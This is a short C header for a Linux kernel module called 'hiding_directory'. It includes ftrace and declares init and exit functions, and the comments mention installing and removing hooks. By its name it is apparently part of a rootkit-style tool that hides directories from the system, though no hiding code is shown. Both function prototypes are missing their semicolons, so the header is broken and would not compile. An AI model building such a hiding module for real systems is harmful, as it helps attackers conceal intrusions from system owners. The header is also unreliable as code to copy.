#ifndef HIDING_DIRECTORY_H
#define HIDING_DIRECTORY_H
#include <linux/ftrace.h>

/*
 * Initializes the hiding_directory module.
 * 
 * Returns:
 *   0 on success
 *   Negative error code on failure.
 */
int hiding_directory_init(void)


/*
 * Cleans up and unloads the hiding_directory module.
 * 
 * This function should reverse everything done in hiding_directory_init(),
 * such as removing hooks and freeing allocated resources.
 */

void hiding_directory_exit(void)

#endif